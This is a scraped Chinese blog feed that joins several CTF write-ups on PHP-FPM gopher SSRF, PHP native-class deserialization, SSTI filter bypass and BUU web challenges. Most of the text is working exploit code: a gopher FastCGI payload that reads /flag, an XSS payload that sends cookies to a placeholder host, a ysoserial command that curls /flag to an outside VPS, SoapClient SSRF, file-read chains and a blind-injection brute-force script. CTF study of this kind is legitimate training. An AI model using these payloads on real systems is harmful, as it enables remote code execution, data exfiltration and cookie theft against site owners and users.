$phar-&gt;setMetadata($b); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); ?&gt; 第一个要注意的地方，这里etc/hosts没法读到内网ip，只能用/proc/net/arp这里我读到的是10.0.199.2 然后具体哪个会回显PHP-FPM是要自己一个个试的 我试了3、4、5 都没有 然后直接试了11是可以的。 那么php-fpm是啥呢？跟着p牛的博客学习一下：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html 精简下内容方便查看： FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。 FPM按照fastcgi的协议将TCP流解析成真正的数据。 举个例子，用户访问http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对： { &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;, &#39;REQUEST_METHOD&#39;: &#39;GET&#39;, &#39;SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php&#39;, &#39;SCRIPT_NAME&#39;: &#39;/index.php&#39;, &#39;QUERY_STRING&#39;: &#39;?a=1&amp;b=2&#39;, &#39;REQUEST_URI&#39;: &#39;/index.php?a=1&amp;b=2&#39;, &#39;DOCUMENT_ROOT&#39;: &#39;/var/www/html&#39;, &#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;, &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;REMOTE_PORT&#39;: &#39;12345&#39;, &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;SERVER_PORT&#39;: &#39;80&#39;, &#39;SERVER_NAME&#39;: &quot;localhost&quot;, &#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39; } 这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。 PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。 Nginx（IIS7）解析漏洞：fpm发现/var/www/html/favicon.ico/.php不存在，则去掉/.php，再判断/var/www/html/favicon.ico是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。 在fpm某个版本之前，我们可以将SCRIPT_FILENAME的值指定为任意后缀文件，比如/etc/passwd；但后来，fpm的默认配置中增加了一个选项security.limit_extensions，只能以phpx结尾。由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。 那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？ 理论上当然是不可以的，即使我们能控制SCRIPT_FILENAME，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。 但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。 auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。 那么就有趣了，假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include） 那么，我们怎么设置auto_prepend_file的值？ 这又涉及到PHP-FPM的两个环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中） 所以，我们最后传入如下环境变量： { &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;, &#39;REQUEST_METHOD&#39;: &#39;GET&#39;, &#39;SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php&#39;, &#39;SCRIPT_NAME&#39;: &#39;/index.php&#39;, &#39;QUERY_STRING&#39;: &#39;?a=1&amp;b=2&#39;, &#39;REQUEST_URI&#39;: &#39;/index.php?a=1&amp;b=2&#39;, &#39;DOCUMENT_ROOT&#39;: &#39;/var/www/html&#39;, &#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;, &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;REMOTE_PORT&#39;: &#39;12345&#39;, &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;SERVER_PORT&#39;: &#39;80&#39;, &#39;SERVER_NAME&#39;: &quot;localhost&quot;, &#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39; &#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;, &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On&#39; } exp：https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 最后构造gopher协议即可payload： gopher://10.0.199.11:9000/_%01%01%F6%FD%00%08%00%00%00%01%00%00%00%00%00%00%01%04%F6%FD%01%DC%00%00%0E%03CONTENT_LENGTH203%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%F6%FD%00%00%00%00%01%05%F6%FD%00%CB%00%00%3C%3Fphp%20mkdir%28%27/tmp/fuck%27%29%3Bchdir%28%27/tmp/fuck%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Bprint_r%28scandir%28%27/%27%29%29%3Breadfile%28%27/flag%27%29%3B%3F%3E%01%05%F6%FD%00%00%00%00 里面还有一个知识点，open_basedir的绕过和disable_function的限制。四个执行函数都被ban了，用readfile代替即可。open_basedir绕过的姿势网上有很多，这里我用的是通过chdir()和ini_set()来进行跨路径访问，网上找姿势的时候记得这里题目是php7，有些老版本的是不行的。参考链接：https://xz.aliyun.com/t/4720 好耶 学到许多","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Node.js","slug":"Node-js","date":"2021-04-06T06:26:32.000Z","updated":"2021-04-06T06:28:11.478Z","comments":true,"path":"2021/04/06/Node-js/","link":"","permalink":"/2021/04/06/Node-js/","excerpt":"","text":"从官方文档开始学习：https://nodejs.dev/learnNode.js常见漏洞学习：https://xz.aliyun.com/t/71841、CTFSHOW 看WP云做题学习一些姿势。https://blog.csdn.net/miuzzx/article/details/111780832https://blog.csdn.net/rfrder/article/details/115218397https://blog.csdn.net/solitudi/article/details/111669500 2、Javascript原型链官方文档：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain p神：https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html其中看到p神一句话写的很好：“我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。” 暂时先看到这里","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"PHP原生类的利用总结","slug":"PHP原生类的利用总结","date":"2021-03-29T15:02:46.000Z","updated":"2021-03-30T04:57:55.274Z","comments":true,"path":"2021/03/29/PHP原生类的利用总结/","link":"","permalink":"/2021/03/29/PHP原生类的利用总结/","excerpt":"","text":"如题。 使用 Error/Exception 内置类进行 XSS出处：[BJDCTF 2nd]xss之光源码： &lt;?php $a = $_GET[&#39;yds_is_so_beautiful&#39;]; echo unserialize($a); ?&gt; Exception payload(适用于php5和php7): &lt;?php $a = serialize(new Exception(&quot;&lt;script&gt;window.location.href=&#39;IP&#39;+document.cookie&lt;/script&gt;&quot;)); echo urlencode($a); ?&gt; Error payload(适用于php7)： &lt;?php $a = new Error(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;); $b = serialize($a); echo urlencode($b); ?&gt; ps：如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。 使用 Error/Exception 内置类绕过哈希比较出处：[极客大挑战 2020]Greatphp源码： class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } 既要绕过md5又要命令执行正常是很难实现的。md5/sha1对一个类进行hash的时候会触发那个类的toString，这里由于没有可以利用的类，所以需要寻找原生类，比如Error,Exception等，然后由于Error的toString是无法完全控制的，会有其他输出，所以使用?&gt;&lt;?=的方式结束php从而完整控制整块代码，(这里有个坑就是Error必须不等，但toString生成的结果必须相等，由于toString生成的结果包含当前代码所在的行，所以新生成的2个实例必须在同一行)，因为禁用了小括号无法调用函数，尝试直接include “/flag”即可。 exp： &lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup() { if (($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc) === sha1($this-&gt;lover))) { if (!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;var1, $match)) { eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } $str = &quot;?&gt;&quot;.&quot;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;; $a = new Exception($str, 1);$b = new Exception($str, 2); $c = new SYCLOVER(); $c-&gt;syc = $a; $c-&gt;lover = $b; echo(urlencode(serialize($c))); ?&gt; 使用SoapClient类进行 SSRF这个就很常见了。大概都是这样的：需要admin 127.0.0.1登录 然后又是remoteaddr无法直接伪造，所以找到能实例化任意类的地方用 SoapClient 类进行 SSRF。 exp： &lt;?php $target = &#39;http://123.206.216.198/bbb.php&#39;; $post_string = &#39;a=b&amp;flag=aaa&#39;; $headers = array( &#39;X-Forwarded-For: 127.0.0.1&#39;, &#39;Cookie: xxxx=1234&#39; ); $b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39; =&gt; &quot;aaab&quot;)); $aaa = serialize($b); $aaa = str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,$aaa); $aaa = str_replace(&#39;&amp;&#39;,&#39;%26&#39;,$aaa); echo $aaa; ?&gt; 使用ZipArchive类删除文件出处：NepCTF 2021 梦里花开牡丹亭pop链很简单，考点就是利用ZipArchive类的open方法去删除waf.txt文件 原理如上。 利用SLP类中的类读文件出处：MAR DASCTF2021-ez_serialize也是一个思路很简单的反序列化，就是考原生类的利用。官方文档：https://www.php.net/manual/zh/book.spl.php 源码： &lt;?php error_reporting(0); highlight_file(__FILE__); class A{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = &quot;B&quot;; $this-&gt;para = &quot;ctfer&quot;; echo new $this-&gt;class ($this-&gt;para); } public function __wakeup() { $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die(&#39;bad hacker~&#39;); } } class B{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); } } class C{ function vaild($code){ $pattern = &#39;/[!|@|#|$|%|^|&amp;|*|=|\\&#39;|&quot;|:|;|?]/i&#39;; if (preg_match($pattern, $code)){ return false; } else return true; } } if(isset($_GET[&#39;pop&#39;])){ unserialize($_GET[&#39;pop&#39;]); } else{ $a=new A; } hello ctfer exp1(查看目录): &lt;?php class A{ public $class=&#39;FilesystemIterator&#39;; public $para=&quot;/var/www/html&quot;; public $check; } $o = new A(); echo serialize($o); exp2(读flag): &lt;?php class A{ public $class=&#39;SplFileObject&#39;; public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;; public $check; } $o = new A(); echo serialize($o); 未完待续","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"/tags/PHP/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"SSTI比较离谱的绕过","slug":"SSTI比较离谱的绕过","date":"2021-03-29T11:14:58.000Z","updated":"2021-03-29T15:01:12.769Z","comments":true,"path":"2021/03/29/SSTI比较离谱的绕过/","link":"","permalink":"/2021/03/29/SSTI比较离谱的绕过/","excerpt":"","text":"MAR DASCTF放出来的第一道就是个SSTI。过滤很多，试了几个就没耐心做下去了。记得y1ng师傅之前写过一道这种绕过的WP，但是cnblog挂了，所以干脆就等结束了再来学习一下吧。 首先 必须要准备一个环境 这里我推荐vulhub github开源 里面集成了很多框架的漏洞。搭建完毕： 题目直接给了blacklist： Hi young boy!&lt;/br&gt; Do you like ssti?&lt;/br&gt; blacklist&lt;/br&gt; &#39;.&#39;,&#39;[&#39;,&#39;\\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt; &#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt; &#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt; &#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt; &#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt; &lt;/br&gt; 比赛的时候就试了常见的几个[]、16进制、request等一些常见的（没看到有源码） 一、UNICODE魔改字符https://www.compart.com/en/unicode/比如我们搜索{符号，就会显示几个相似的： 网上找的师傅的图： 但是我在本地测试并没有成功： 可能此方法只在特定环境下有用，据说这道题是可以用的。 二、join拼接构造globals： {% set gl=dict(glo=a,bals=a)|join%}{{gl}} 接下来就是想办法构造数字和特殊字符。（数字可用Unicode上面写了，就不赘述了一般获取这样的东西的思路是2个，要么利用config，要么利用()|select|string。当然了，一般会想着先弄到数字。数字的思路大概也是2个，要么利用内置的过滤器count或者length，要么用index。这题过滤了count和length，我考虑用index来得到数字（当然，用unicode的话就变得非常简单了，不过我只讲一下不利用unicode的思路），原理是这样： {{lipsum|string|lust}} {{(lipsum|string|list).index('f')}} 注：index取得字符第一次出现的位置但是单引号此题被过滤了，所以用拼接赋值来代替单引号的作用： {% set num=dict(f=a)|join%}{{(lipsum|string|list).index(num)}} 成功取到1 lipsum中已有下划线，所以我们还需要方括号和点。 方括号：{{(lipsum|string|list).pop(18)}} 点：attr代替 接下来就很简单了，拼接调用完事直接放别的师傅的payload： 构造出来了就可以随意组了，这位师傅的payload确实是有些复杂了，有些地方可以优化的，应该是比赛的时候没时间。flag就是文件名。总结：自己还是太懒了。。明明稍微研究一下就能出的东西，可能这就是和大师傅们的差距吧。 链接：SSTI过滤总结：https://blog.csdn.net/miuzzx/article/details/110220425WP参考：https://blog.csdn.net/rfrder/article/details/115272645https://jan.show/?p=59","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"BUU近期刷题记录","slug":"BUU近期刷题记录","date":"2021-03-28T12:44:20.000Z","updated":"2021-03-28T13:02:18.469Z","comments":true,"path":"2021/03/28/BUU近期刷题记录/","link":"","permalink":"/2021/03/28/BUU近期刷题记录/","excerpt":"","text":"[Black Watch 入群题]Web2Secret [Zer0pts2020]phpNantokaAdmin关键词：sqlite trick根据提示这是一个 Sqlite 数据库，相应的操作有创建表、插入值和删除表，那么有可能存在注入的是创建表和插入值，但是插入值那里似乎注不了，所以注入点应该在创建表那里首先我们需要知道 Sqlite 的一些特性当 Sqlite 进行 select 时，可以用[]、’、” 和 ` 来装饰列名，位于列名后面的字段被称为别名，如create table 时支持一种 as 的语法参数处有 32 长度的字符限制，所以我们不能进行常规的查表查字段，不过我们直接直接查询当前表的 sql 语句，还有过滤了一些标点符号，其中过滤了注释符 – ，可以用 ; 进行闭合查询当前表的数据操作table_name=kk as select [sql][&amp;columns[0][name]=1&amp;columns[0][type]=]from sqlite_master; [FBCTF2019]Products Manager关键词：mysql trickwww.zip注册个facebook后面跟大于六十个空格的账号然后facebook登陆即可。https://www.cnblogs.com/wkzb/p/12286303.html [网鼎杯 2020 朱雀组]Think Java参考：https://www.bilibili.com/video/av840794036/；https://blog.csdn.net/weixin_43610673/article/details/106214366关键词：jdbc trick；java 反序列化给了源码，很容易跟踪到sql注入处（jdgui）。dbName可控，源码如下dbName = “jdbc:mysql://mysqldbserver:3306/“ + dbName;这里是一个jdbc的trickjdbc:mysql://mysqldbserver:3306/?dbName=myapp?a=’ union select group_concat(pwd)from(user)#在jdbc后面加问号可以引用其一些属性。注出密码：admin@Rrrr_ctf_asde，但是仍需要登录接口。接下来看到一开始就在跑的dirsearch跑出/swagger-ui.html，也有师傅说看到import io.swagger.annotations.ApiOperation;应该能想到有swagger-ui.html登陆成功，得到一串rO0A开头的代码，是Java序列化base64加密的数据开头。如果以aced开头，那么他就是这一段Java序列化的16进制/common/user/current 查看用户信息，auth 头是一个序列化后的信息，在查看用户信息时提交这个Bearer token进行反序列化。用ysoserial 打java -jar ysoserial-0.0.5.jar ROME “curl http://121.196.169.53:3333 -d @/flag” | base64 -w 0current打过去，VPS监听3333端口我这里直接带出数据，看到有的师傅能拿到权限有的不能，发生甚么事了。弹shell命令：https://www.cnblogs.com/20175211lyz/p/12397933.html [HCTF 2018]Hideandseek关键词：软链接文件读取 session伪造 伪随机数ln -s /proc/self/environ troyezip -y troye.zip troye读取的内容： HOSTNAME=4ae8a62e14bcSHLVL=1PYTHON_PIP_VERSION=19.1.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/uwsgi.iniWERKZEUG_SERVER_FD=3NGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/static_=/usr/local/bin/pythonUWSGI_CHEAPER=2WERKZEUG_RUN_MAIN=trueNGINX_VERSION=1.15.8-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.15.8.0.2.7-1~stretchLANG=C.UTF-8PYTHON_VERSION=3.6.8NGINX_WORKER_PROCESSES=1LISTEN_PORT=80STATIC_INDEX=0PWD=/appPYTHONPATH=/appSTATIC_PATH=/app/staticFLAG=not_flag 无key，继续读取/app/uwsgi.ini[uwsgi]module = maincallable=applogto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log 继续读取源码/app/main读不出来，看了wp可能是buu环境问题，这里应该显示/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 所以读取/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py部分代码：random.seed(uuid.getnode())app = Flask(name)app.config[‘SECRET_KEY’] = str(random.random()*100)显然是个伪随机数，百度uuid.getnode()得：on a machine with multiple network interfaces the MAC address of any one of them may be returned.（这个函数可以获取网卡mac地址并转换成十进制数返回）/proc/net/arp查看连接到本机的远端ip的mac地址/sys/class/net/eth0/address 查看eth0的mac地址（用这个）得到02:42:ac:10:b7:0epython3 flask_session_manager.py encode -s ‘61.372777952686’ -t “{‘username’:’admin’}” [FireshellCTF2020]URL TO PDF关键词：WeasyPrint看上去是ssrf，但是输啥都是invalid url。连一下自己服务器试试：User-Agent: WeasyPrint 51 (http://weasyprint.org/)google 可以解析或在自己vps上布置一个html即可。 PyCalX 1&amp;2关键词：python参考：https://www.secpulse.com/archives/73724.html首先是PyCalX 1：（这道题1和2放一起了根据源码，flag已经在FLAG变量里了，所以只要想办法读取即可。但是有两个过滤的函数 def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [&#39;(&#39;,&#39;)&#39;,&#39;[&#39;,&#39;]&#39;,&#39;\\&#39;&#39;,&#39;&quot;&#39;] # I don&#39;t like tuple, list and dict. if val == &#39;&#39; or [c for c in blacklist if c in val] != []: print(&#39;&lt;center&gt;Invalid value&lt;/center&gt;&#39;) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [&#39;+&#39;,&#39;-&#39;,&#39;/&#39;,&#39;*&#39;,&#39;=&#39;,&#39;!&#39;] if val == &#39;&#39; or val[0] not in list_ops: print(&#39;&lt;center&gt;Invalid op&lt;/center&gt;&#39;) sys.exit(0) return val 本地精简代码测试一下paylaod #coding=utf-8import sysfrom html import escape def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [‘(‘, ‘)’, ‘[‘, ‘]’, ‘\\’’, ‘“‘] # I don’t like tuple, list and dict. if val == ‘’ or [c for c in blacklist if c in val] != []: print(‘Invalid value‘) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [‘+’, ‘-‘, ‘/‘, ‘*’, ‘=’, ‘!’] if val == ‘’ or val[0] not in list_ops: print(‘Invalid op‘) sys.exit(0) return val value1=”1”value2=”2”op=”+”value1=get_value(value1)value2=get_value(value2)op=get_op(op)calc_eval = str(repr(value1)) + str(op) + str(repr(value2))result = str(eval(calc_eval))print(‘&gt;&gt;&gt;&gt; print(‘+escape(calc_eval)+’)’)print(result) 其中get_op函数是两位但是却只检测第一位，很明显可以利用。repr() 函数将对象转化为供解释器读取的形式，当传入不是数字是字符串的时候，会引入引号。所以当我们传入value1=’a’,value2=’a’,op=”+’”时，语句变为’a’+’’a’，肯定会报错。注释掉后面那个引号后，即 value1=’a’,value2=’#a’,op=”+’”，语句变为’a’+’’#a’ 输出a，单引号成功逃逸。利用 value1=”a” value2=” and 1#a” op=”+’” 语句为’a’+’’ and 1 #a。先加法后与运算，输出1。然而这里无法直接输出flag，因为输出有一个条件：if result.isdigit() or result == ‘True’ or result == ‘False’: print(result)result必须有结果或者是bool值。但是由于过滤了括号 方括号，很难直接进行判断。这里要用到之前的source变量。 arguments = cgi.FieldStorage() if ‘source’ in arguments: source = arguments[‘source’].valueelse: source = 0 if source == ‘1’: print(‘‘+escape(str(open(file,’r’).read()))+’‘) source赋值使用后仍然存在，是我们的可控点，且无过滤函数，我们可以通过它配合in进行猜解Flag，猜解成功页面返回True，错误则返回Flase。 ?value1=a&amp;op=%2b%27&amp;value2=and%20True%20and%20source%20in%20FLAG%23&amp;source=f返回TrueExp： import requestsfrom urllib.parse import quote flag = “flag{“url = “http://ff388d1d-d624-45f2-baad-198952fd236b.node3.buuoj.cn/cgi-bin/pycalx.py?value1=a&amp;op=%2b%27&amp;value2=and%20True%20and%20source%20in%20FLAG%23&amp;source={0}”.format(quote(flag))for a in range(1,100): url = “http://ff388d1d-d624-45f2-baad-198952fd236b.node3.buuoj.cn/cgi-bin/pycalx.py?value1=a&amp;op=%2b%27&amp;value2=and%20True%20and%20source%20in%20FLAG%23&amp;source={0}”.format(quote(flag)) for i in range(32,128): nurl = url + quote(chr(i)) r = requests.get(url=nurl) #print(nurl) if &quot;False&quot; in r.text: nurl = url continue else: flag+=chr(i) print(flag) 忘记用二分法确实是有些憨批了。PyCalx2过滤了op里的引号。根据上一题的Flag，可以知道版本是python3.6，这里需要使用F-strings.。（原题flag）F-strings提供了一种明确且方便的方式将python表达式嵌入到字符串中来进行格式化。使用F-strings我们不用逃逸单引号，因为它支持表达式。 以f 开头，表达式插在大括号{} 里，在运行时表达式会被计算并替换成对应的值。 str(repr(‘T’))+str(‘+f’)+str(repr(‘ru{FLAG&lt;source or 14:x}’)) # 14的十六进制表示时’e’“‘T’+f’ru{FLAG&lt;source or 14:x}’”eval(str(repr(‘T’))+str(‘+f’)+str(repr(‘ru{1 or 14:x}’)))‘Tru1’ # 返回Invalideval(str(repr(‘T’))+str(‘+f’)+str(repr(‘ru{0 or 14:x}’)))‘True’ [极客大挑战 2020]Greatphp关键词：php内置类的利用参考：https://github.com/WAY29/geek-2020-challenges/blob/main/roamphp7-greatphp/wp/wp.mdhttps://cn-sec.com/archives/286121.html（PHP原生类利用小结，很不错） class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } 正常来看的话，又要过if又要过waf还要命令执行，似乎是一件不可能的事情。所以这里要用到内置类error。考点是md5/sha1可以对一个类进行hash,会触发一个类的__toString方法,这里由于没有可以利用的类,所以需要寻找原生类,比如Error,Exception等,然后由于Error的toString是无法完全控制的,会有其他输出,所以使用?&gt;&lt;?=的方式结束php从而完整控制整块代码,(这里有个坑就是Error必须不等,但toString生成的结果必须相等,由于toString生成的结果包含当前代码所在的行,所以新生成的2个实例必须在同一行),因为禁用了小括号无法调用函数,尝试直接include “/flag”即可. exp： &lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup() { if (($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc) === sha1($this-&gt;lover))) { if (!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;var1, $match)) { eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } $str = &quot;?&gt;&quot;.&quot;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;; $a = new Exception($str, 1);$b = new Exception($str, 2); $c = new SYCLOVER(); $c-&gt;syc = $a; $c-&gt;lover = $b; echo(urlencode(serialize($c))); ?&gt; [网鼎杯 2020 半决赛]faka关键词：tp5一个发卡平台没找到明显的利用点，这种现成的平台基本上都是有cve的。给了源码，在tk.sql找到admin密码，解密得admincccbbb123，成功登录后台。有点像之前一个更换主题getshell的，但这里不是。有两种解法。 一、任意文件读取seay也提示这里可能存在任意文件读取。但是提示的位置有600处没注意到。位置：application/manage/controller/Backup.php源码： function downloadBak() { $file_name = $_GET[‘file’]; $file_dir = $this-&gt;config[‘path’]; if (!file_exists($file_dir . “/“ . $file_name)) { //检查文件是否存在 return false; exit; } else { $file = fopen($file_dir . “/“ . $file_name, “r”); // 打开文件 // 输入文件标签 header(‘Content-Encoding: none’); header(“Content-type: application/octet-stream”); header(“Accept-Ranges: bytes”); header(“Accept-Length: “ . filesize($file_dir . “/“ . $file_name)); header(‘Content-Transfer-Encoding: binary’); header(“Content-Disposition: attachment; filename=” . $file_name); //以真实文件名提供给浏览器下载 header(‘Pragma: no-cache’); header(‘Expires: 0’); //输出文件内容 echo fread($file, filesize($file_dir . “/“ . $file_name)); fclose($file); exit; } }/manage/Backup/downloadBak?file=../../../../../../flag.txt 二、后台文件上传GetShell位置：application/admin/controller/Plugs.php上传的时候会先调用 upstate public function upstate() { $post = $this-&gt;request-&gt;post(); $filename = join(&#39;/&#39;, str_split($post[&#39;md5&#39;], 16)) . &#39;.&#39; . pathinfo($post[&#39;filename&#39;], 4); // 检查文件是否已上传 if (($site_url = FileService::getFileUrl($filename))) { $this-&gt;result([&#39;site_url&#39; =&gt; $site_url], &#39;IS_FOUND&#39;); } // 需要上传文件，生成上传配置参数 $config = [&#39;uptype&#39; =&gt; $post[&#39;uptype&#39;], &#39;file_url&#39; =&gt; $filename]; switch (strtolower($post[&#39;uptype&#39;])) { case &#39;qiniu&#39;: $config[&#39;server&#39;] = FileService::getUploadQiniuUrl(true); $config[&#39;token&#39;] = $this-&gt;_getQiniuToken($filename); break; case &#39;local&#39;: $config[&#39;server&#39;] = FileService::getUploadLocalUrl(); 